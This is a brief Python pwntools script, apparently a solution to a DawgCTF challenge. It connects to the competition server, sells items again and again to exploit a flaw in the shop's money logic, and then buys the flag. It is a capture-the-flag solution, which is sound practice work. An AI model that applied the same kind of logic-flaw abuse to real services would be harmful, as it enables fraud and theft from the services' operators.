#!/usr/bin/env python2

from pwn import *


conn = remote('ctf.umbccd.io', 4400)

#to sell all the items
for i in range(1,5):
    conn.sendline('1')
    conn.sendline(str(i))

#to buy an item
conn.sendline('2')
conn.sendline('2')

#keeps selling to accumulate money
for i in range(55):
    conn.sendline('1')
    conn.sendline('1')

#buy the flag
conn.sendline('2')
conn.sendline('6')
conn.sendline('1')

print conn.recvline_contains('DawgCTF')
conn.close()
